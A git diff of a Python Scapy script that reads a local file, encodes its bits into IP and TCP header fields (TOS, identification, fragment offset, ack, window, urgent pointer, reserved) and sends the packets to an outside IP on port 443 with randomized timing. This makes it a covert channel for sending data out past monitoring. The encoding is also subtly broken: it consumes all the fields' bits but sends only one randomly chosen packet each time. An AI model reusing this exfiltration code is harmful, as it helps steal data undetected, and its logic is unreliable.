@@ -1,79 +1,116 @@
 from scapy.all import *
+from scapy.arch.windows import get_windows_if_list
+import random
+import time
+import pandas as pd
 
-file = open(r'C:\\Users\Nikita\Desktop\111.txt', 'rb')
-sym = file.read(1)
-arr = []
-while sym:
- arr.extend('{:08b}'.format(ord(sym)))
- sym = file.read(1)
-cnt = 0
-while len(arr) > 0:
-#length
- a = int(arr.pop(0))
- b = int(arr.pop(0))
- c = int(arr.pop(0))
- d = int(arr.pop(0))
- length = 8*a + 4*b + 2*c + d
-#TOS
- f = int(arr.pop(0))
- g = int(arr.pop(0))
- h = int(arr.pop(0))
- i = int(arr.pop(0))
- j = int(arr.pop(0))
- k = int(arr.pop(0))
- l = int(arr.pop(0))
- dscp = 32*h + 16*i + 8*j + 4*k + 2*l
- ecn = 128*f + 64*g
- tos = 128*f + 64*g + 32*h + 16*i + 8*j + 4*k + 2*l
- #Ident
- n = int(arr.pop(0))
- o = int(arr.pop(0))
- p = int(arr.pop(0))
- q = int(arr.pop(0))
- r = int(arr.pop(0))
- s = int(arr.pop(0))
- t = int(arr.pop(0))
- ident = 128*n + 64*o + 32*p + 16*q + 8*r + 4*s + 2*t
-#urgptr
- v = int(arr.pop(0))
- w = int(arr.pop(0))
- x = int(arr.pop(0))
- y = int(arr.pop(0))
- z = int(arr.pop(0))
- aa = int(arr.pop(0))
- ab = int(arr.pop(0))
- urg = 128*v + 64*w + 32*x + 16*y + 8*z + 4*aa + 2*ab
-#ack
- ad = int(arr.pop(0))
- ae = int(arr.pop(0))
- af = int(arr.pop(0))
- ag = int(arr.pop(0))
- ah = int(arr.pop(0))
- ai = int(arr.pop(0))
- aj = int(arr.pop(0))
- ack = 512*ad + 256*ae + 128*af + 32*ag + 8*ah + 4*ah + 2*aj
-#window
- al = int(arr.pop(0))
- am = int(arr.pop(0))
- an = int(arr.pop(0))
- ao = int(arr.pop(0))
- ap = int(arr.pop(0))
- aq = int(arr.pop(0))
- at = int(arr.pop(0))
- wind = 512*al + 256*am + 128*an+ 32*ao + 8*ap + 4*aq + 2*at
- udpone = random.randint(1,1024)
- udptwo = random.randint(1,1024)
- tcpone = random.randint(1,1024)
- tcptwo = random.randint(1,1024)
- pktcp = IP(src="192.168.88.248", dst="192.168.88.247", len=length, tos=tos, id=ident) / TCP(sport=tcpone,dport=tcptwo, ack=ack, urgptr=urg,window=wind,flags="AU")
 
- pkudp = IP(src="192.168.88.248", dst="192.168.88.247") /UDP(sport=udpone, dport=udptwo, len=8)
- #packets = sniff(filter="host 10.98.14.135", prn=lambda x: x.show())
- #packets.show()
- time.sleep(random.uniform(0.05,0.10))
- send(pktcp)
- cnt=cnt+2
- time.sleep(random.uniform(0.10,0.20))
- #cnt=cnt+1
- send(pkudp)
- print(cnt)
+class PacketField:
+    def __init__(self, bits):
+        self.bits = bits
+
+    def calculate_value(self, bit_array):
+        value = 0
+        for bit in self.bits:
+            value = (value << 1) + int(bit_array.pop(0))
+        return value
+
+
+def read_file_to_bit_array(filepath):
+    with open(filepath, 'rb') as file:
+        content = file.read()
+    bit_array = []
+    for byte in content:
+        bit_array.extend(format(byte, '08b'))
+    return bit_array
+
+
+def generate_packet(bit_array, dst_addr, src_addr):
+
+    # Documentation about scapy definitions of proto fields in
+    # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html
+
+    ip_length = PacketField([1, 1, 1, 1, 1]).calculate_value(bit_array)  # IP/Length
+    tos = PacketField([1, 1, 1, 1, 1, 1, 1, 1]).calculate_value(bit_array)  # IP/TOS
+    ident = PacketField([1 for _ in range(16)]).calculate_value(bit_array)  # IP/Identification
+    frag = PacketField([1 for _ in range(13)]).calculate_value(bit_array)  # IP/Fragment Offset
+    ack = PacketField([1 for _ in range(32)]).calculate_value(bit_array)  # TCP/Acknowledgement
+    wind = PacketField([1 for _ in range(16)]).calculate_value(bit_array)  # TCP/Window Size
+    urg = PacketField([1 for _ in range(16)]).calculate_value(bit_array)  # TCP/Urgent Pointer
+    res = PacketField([1, 1, 1]).calculate_value(bit_array)  # TCP/Reserved
+
+    src_port = random.randint(50201, 65534)
+    dst_port = 443
+    # default_udp_len =
+    ip_field_dict = [
+        {'len': ip_length},
+        {'tos': tos},
+        {'id': ident},
+        {'frag': frag}
+    ]
+    tcp_field_dict = [
+        {'ack': ack},
+        {'window': wind},
+        {'urgptr': urg},
+        {'reserved': res}
+    ]
+
+    packets = []
+
+    for args in ip_field_dict:
+        if "len" in args:
+            pkt_var_1 = IP(src=src_addr, dst=dst_addr, **args) / UDP(sport=src_port, dport=dst_port, len=ip_length)
+        else:
+            pkt_var_1 = IP(src=src_addr, dst=dst_addr, **args) / UDP(sport=src_port, dport=dst_port, len=8)
+        packets.append(pkt_var_1)
+
+    for args in tcp_field_dict:
+        pkt_var_2 = IP(src=src_addr, dst=dst_addr) / TCP(sport=src_port, dport=dst_port, flags="AU", **args)
+        packets.append(pkt_var_2)
+
+    pkt_full = IP(src=src_addr, dst=dst_addr, len=ip_length, tos=tos, id=ident, frag=frag) / \
+               TCP(sport=src_port, dport=dst_port, ack=ack, urgptr=urg, window=wind, flags="AU", reserved=res)
+    packets.append(pkt_full)
+
+    pkt = random.choice(packets)
+
+    return pkt
+
+
+def iface_ip_detect():
+    global iface_ip, detected_real_iface
+    interfaces = pd.DataFrame(get_windows_if_list())
+    iface_filter = interfaces['ipv4_metric'] != 0
+    interfaces = pd.DataFrame(interfaces[iface_filter])
+    df = interfaces[['name']]
+    iface_list = df['name'].tolist()
+    # print("Available interfaces:")
+    i = 1
+    for iface in iface_list:
+        # print(" ",i,iface)
+        i = i + 1
+        if "ethernet" in iface.lower():
+            iface_ip = get_if_addr(iface)
+            detected_real_iface = iface
+    print(f"Detected iface is:", detected_real_iface)
+    print(f"IP address of {detected_real_iface}: {iface_ip}")
+    return iface_ip
+
+
+def main():
+    # Configure program
+    source_address = iface_ip_detect()
+    dest_address = "91.197.194.73"
+    path_to_txt_file = r'C:\Users\Nikita\Desktop\111.txt'
+    bit_array = read_file_to_bit_array(path_to_txt_file)
+    cnt = 0
+    while len(bit_array) > 0:
+        pkt = generate_packet(bit_array, dest_address, source_address)
+        time.sleep(random.uniform(0.05, 0.10))
+        send(pkt)
+        cnt += 1
+        print(cnt)
+
+
+if __name__ == "__main__":
+    main()
